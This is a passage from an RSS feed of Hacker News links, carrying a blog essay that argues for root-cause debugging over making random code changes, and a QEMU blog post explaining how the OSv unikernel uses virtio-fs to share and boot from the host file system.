            <pubDate>Fri, 13 Nov 2020 00:51:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don’t Be an Evolutionary Programmer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077333">thread link</a>) | @whack
<br/>
November 12, 2020 | https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://www.flickr.com/photos/45752180@N03/5465488239" target="_blank" rel="noreferrer noopener"><img data-attachment-id="173" data-permalink="https://software.rajivprab.com/5465488239_bd90ac9589_z/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg" data-orig-size="556,369" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5465488239_bd90ac9589_z" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg?w=556" src="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg" alt=""></a></figure></div>



<p><span>When you run into a problem, a bug in your code, how do you try to fix it?</span></p>



<p><span>Do you try to debug the problem, in order to figure out what the root cause is? Do you use tools like debuggers, loggers or code inspections, in order to better understand where and what is causing the problem, and then carefully analyze the best way to fix it?</span></p>



<p><span>Or do you make random changes to random parts of your code, see if that fixes anything, and repeat the above loop over and over again until things start working?</span></p>



<p><span>I like to call the latter approach </span><i>“</i><i><span>Evolutionary Programming</span></i><span>“. Comparing this style of programming to evolution is probably giving it too much credit, but it’s actually a pretty apt analogy. Evolution, through random mutation and natural selection, is the polar opposite of </span><a rel="noopener" href="https://en.wikipedia.org/wiki/Intelligent_design" target="_blank">Intelligent Design</a><span>. Evolution has no sense of analysis, design or intelligence. It simply mutates random portions of your code (DNA), keeps the changes that “made things better,” discards the rest, and keeps looping through this forever until it gets to something successful.</span></p>



<p><span>Such an evolutionary approach is already being used in specific subdomains, such as </span><a href="https://en.wikipedia.org/wiki/Machine_learning" target="_blank" rel="noopener">Machine Learning</a><span> and AI development. Maybe one day, someone will figure out how to make the evolutionary approach work in mainstream Java programming as well. However, that day is certainly not today. If you’re a programmer and your personal approach to fixing bugs is to rely on the Evolutionary Method, don’t. You’re doing something very very wrong.</span></p>



<p><i><span>“But evolution works”</span></i><span> you may argue. </span><i><span>“If it can produce something as complex as human beings, why not use that same method in my daily programming?”</span></i><span> Well, consider this:</span></p>



<ul><li>It took evolution a billion years to accomplish what software developers were able to accomplish in decades. That’s a 10000000x difference in development velocity.</li><li><span>The end-product of evolution is something so complex, that no human mind can understand it. Consider the </span>millennia<span> that men have spent studying biology &amp; medicine, and we’ve only just started to scratch the surface in the past century.</span></li><li><span>The systems produced by evolution are so interconnected and tightly coupled, that it’s impossible to fix one problem with introducing 100 others. If you need proof of this, look at the list of side-effects that accompany any medical drug.</span></li></ul>



<p><span>I bring up this topic, because I just witnessed it first hand during an interview with an undoubtedly bright candidate. After 40 minutes of building a complex data-structure, it came time to test his creation. He knocked a few easy bugs out of the way in the first few iterations, but hit a brick wall on a more complicated bug. </span></p>



<p><span>Instead of digging deeper into the code in order to understand what it was doing, or using the debug tools in order to narrow down the specific code-block which was showing buggy behavior, he decided to fork off an evolutionary branch. He started mutating random parts of his code, and rerunning, just to see if that somehow fixed things. After 15 minutes without any progress whatsoever, he gave up and was even more confused than when he started.</span></p>



<p><span>A short while later, when trying to debug his code myself, I realized that he actually had a typo in his test-input. Turns out his code was right all along. But by focusing all his efforts on fixing a non-existent bug, instead of trying to understand the real cause of the error, he ended up getting further and further away from the solution with each step.</span></p>



<p><span>If you’re somebody with no aptitude whatsoever for analyzing systems, the evolutionary approach might be your best remaining option. But if your intellectual capacity is indeed lacking so significantly, you really should reconsider your career choice. A different profession, such as politics, might be more up your alley. Maybe one day, someone will build an AI that is capable of developing software using an evolutionary approach. Such a system may actually be successful, because computers can be massively scaled out and parallelized. Unfortunately, the same cannot be said of your labor.</span></p>



<p><span>The next time you hit a problem, don’t just make random changes until something somehow starts working. Such an approach may work in the ultra-short-term, but it’s only going to produce spaghetti code that no one else will be able to understand, reuse or improve upon. You’re not a force of nature, nor are you a robot. Leave evolution to the science textbooks and start practicing some intelligent design.</span></p>



<hr>



<p><em><span>Discussion on </span><a rel="noopener" href="https://www.reddit.com/r/coding/comments/471ua3/dont_be_an_evolutionary_programmer/" target="_blank">/r/coding</a><br><span>Discussion on </span><a rel="noopener" href="https://www.reddit.com/r/programming/comments/471txe/dont_be_an_evolutionary_programmer/" target="_blank">/r/programming</a><br><a rel="noopener" href="http://www.thecaucus.net/#/content/caucus/tech_blog/359" target="_blank">Original post</a> from 2016</em></p>
	</div><div>
				<p><strong>Published</strong>
			<time datetime="2018-04-29T19:40:25+00:00">2018-04-29</time><time datetime="2019-09-10T12:43:47+00:00">2019-09-10</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077333</guid>
            <pubDate>Fri, 13 Nov 2020 00:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Virtio-FS on a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077279">thread link</a>) | @eyberg
<br/>
November 12, 2020 | https://www.qemu.org/2020/11/03/osv-virtio-fs/ | <a href="https://web.archive.org/web/*/https://www.qemu.org/2020/11/03/osv-virtio-fs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
		<div>
			<!-- Main -->
	<section>
		<header>
			
			<p>03 Nov 2020 — by Fotis Xenakis</p>
		</header>
		<p>This article provides an overview of <a href="https://virtio-fs.gitlab.io/">virtio-fs</a>,
a novel way for sharing the host file system with guests and
<a href="https://github.com/cloudius-systems/osv">OSv</a>, a specialized, lightweight
operating system (unikernel) for the cloud, as well as how these two fit
together.</p>

<h2 id="virtio-fs">virtio-fs</h2>

<p>Virtio-fs is a new host-guest shared filesystem, purpose-built for local file
system semantics and performance. To that end, it takes full advantage of the
host’s and the guest’s colocation on the same physical machine, unlike
network-based efforts, like virtio-9p.</p>

<p>As the name suggests, virtio-fs builds on virtio for providing an efficient
transport: it is included in the (currently draft, to become v1.2) virtio
<a href="https://github.com/oasis-tcs/virtio-spec">specification</a> as a new device. The
protocol used by the device is a slightly extended version of
<a href="https://github.com/libfuse/libfuse">FUSE</a>, providing a solid foundation for
all file system operations native on Linux. Implementation-wise, on the QEMU
side, it takes the approach of splitting between the guest interface (handled
by QEMU) and the host file system interface (the device “backend”). The latter
is handled by virtiofsd (“virtio-fs daemon”), running as a separate process,
utilizing the
<a href="https://www.qemu.org/docs/master/interop/vhost-user.html">vhost-user</a> protocol
to communicate with QEMU.</p>

<p>One prominent performance feature of virtio-fs is the DAX (Direct Access)
window. It’s a shared memory window between the host and the guest, exposed as
device memory (a PCI BAR) to the second. Upon request, the host (QEMU) maps file contents to the window for the guest to access directly. This bears performance
gains due to taking VMEXITs out of the read/write data path and bypassing the
guest page cache on Linux, while not counting against the VM’s memory (since
it’s just device memory, managed on the host).</p>

<p><img src="https://gitlab.com/virtio-fs/virtio-fs.gitlab.io/-/raw/master/architecture.svg" alt="virtio-fs DAX architecture"></p>

<p>Virtio-fs is under active development, with its community focussing on a pair of
device implementation in QEMU and device driver in Linux. Both components are
already available upstream in their initial iterations, while upstreaming
continues further e.g. with DAX window support.</p>

<h2 id="osv">OSv</h2>

<p>OSv is a <a href="https://en.wikipedia.org/wiki/Unikernel">unikernel</a> (framework). The
two defining characteristics of a unikernel are:</p>

<ul>
  <li><strong>Application-specialized</strong>: a unikernel is an executable machine image,
consisting of an application and supporting code (drivers, memory management,
runtime etc.) linked together, running in a single address space (typically
in guest “kernel mode”).</li>
  <li><strong>Library OS</strong>: each unikernel only contains the functionality mandated by its
application in terms of non-application code, i.e. no unused drivers, or even
whole subsystems (e.g. networking, if the application doesn’t use the
network).</li>
</ul>

<p>OSv in particular strives for binary compatibility with Linux, using a <a href="https://github.com/cloudius-systems/osv/wiki/Dynamic-Linker">dynamic
linker</a>. This means
that applications built for Linux should run as OSv unikernels without requiring
modifications or even rebuilding, at least most of the time. Of course, not the
whole Linux ABI is supported, with system calls like <code>fork()</code> and relatives
missing by design in all unikernels, which lack the notion of a process. Despite
this limitation, OSv is quite full featured, with full SMP support, virtual
memory, a virtual file system (and many filesystem implementations, including
ZFS) as well as a mature networking stack, based on the FreeBSD sources.</p>

<p>At this point, one is sure to wonder “Why bother with unikernels?”. The problem
they were originally
<a href="http://unikernel.org/files/2013-asplos-mirage.pdf">introduced</a> to solve is the
bloated software stack in modern cloud computing. Running general-purpose
operating systems as guests, typically for a single application/service, on top
of a hypervisor which already takes care of isolation and provides a standard
device model means duplication, as well as loss of efficiency. This is were
unikernels come in, trying to be just enough to support a single application
and as light-weight as possible, based on the assumption that they are executing
inside a VM. Below is an illustration of the comparison between
general-purpose OS, unikernels and containers (as another approach to the same
problem, for completeness).</p>

<p><img src="https://www.qemu.org/screenshots/2020-11-04-unikernel-vs-gpos.svg" alt="Unikernels vs GPOS vs containers"></p>

<h2 id="osv-meet-virtio-fs">OSv, meet virtio-fs</h2>

<p>As is apparent e.g. from the container world, it is very common for applications
running in isolated environments (such as containers, or unikernels even more
so) to require host file system access. Whereas containers sharing the host
kernel thus have an obvious, controlled path to the host file system, with
unikernels this has been more complex: all solutions were somewhat heavyweight,
requiring a network link or indirection through network protocols. Virtio-fs
then provided a significantly more attractive route: straight-forward mapping of
fs operations (via FUSE), reusing the existing virtio transport and decent
performance without high memory overhead.</p>

<p>The OSv community quickly identified the opportunity and came up with a
read-only implementation on its side, when executing under QEMU. This emphasized
being lightweight complexity-wise, while catering to many of its applications’
requirements (they are stateless, think e.g. serverless). Notably, it includes
support for the DAX window (even before that’s merged in upstream QEMU),
providing <a href="https://github.com/foxeng/diploma">excellent performance</a>, directly
rivalling that of its local (non-shared) counterparts such as ZFS and ROFS (an
OSv-specific read-only file system).</p>

<p>One central point is OSv’s support for booting from virtio-fs: this enables
deploying a modified version or a whole new application <strong>without rebuilding</strong>
the image, just by adjusting its root file system contents on the host. Last,
owing to the DAX window practically providing low-overhead access to the host’s
page cache, scalability is also expected to excel, with it being a common
concern due to the potentially high density of unikernels per host.</p>

<p>For example, to build the <code>cli</code> OSv image, bootable from virtio-fs, using the
core OSv <a href="https://github.com/cloudius-systems/osv#building-osv-kernel-and-creating-images">build
system</a>:</p>
<div><div><pre><code>scripts/build fs=virtiofs export=all image=cli
</code></pre></div></div>
<p>This results in a minimal image (just the initramfs), while the root fs contents
are placed in a directory on the host (<code>build/export</code> here, by default).</p>

<p><a href="https://github.com/cloudius-systems/osv#running-osv">Running</a> the above image
is just a step away (may want to use the virtio-fs development version of
<a href="https://gitlab.com/virtio-fs/qemu/-/tree/virtio-fs-dev">QEMU</a>, e.g. for DAX
window support):</p>
<div><div><pre><code>scripts/run.py --virtio-fs-tag=myfs --virtio-fs-dir=$(pwd)/build/export
</code></pre></div></div>
<p>This orchestrates running both virtiofsd and QEMU, using the contents of
<code>build/export</code> as the root file system. Any changes to this directory, directly
from the host will be visible in the guest without re-running the previous build
step.</p>

<h2 id="conclusion">Conclusion</h2>

<p>OSv has gained a prominent new feature, powered by virtio-fs and its QEMU
implementation. This allows efficient, lightweight and performant access to the
host’s file system, thanks to the native virtio transport, usage of the FUSE
protocol and the DAX window architecture. In turn, it enables use cases like
rapid unikernel reconfiguration.</p>

		<ul>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/storage/index.html">storage</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/virtio-fs/index.html">virtio-fs</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/unikernel/index.html">unikernel</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/osv/index.html">OSv</a></li>
		
		</ul>
	</section>

		</div>
	</div></div>]]>
            </description>
            <link>https://www.qemu.org/2020/11/03/osv-virtio-fs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077279</guid>
            <pubDate>Fri, 13 Nov 2020 00:32:02 GMT</pubDate>
        </item>
    </channel>
</rss>
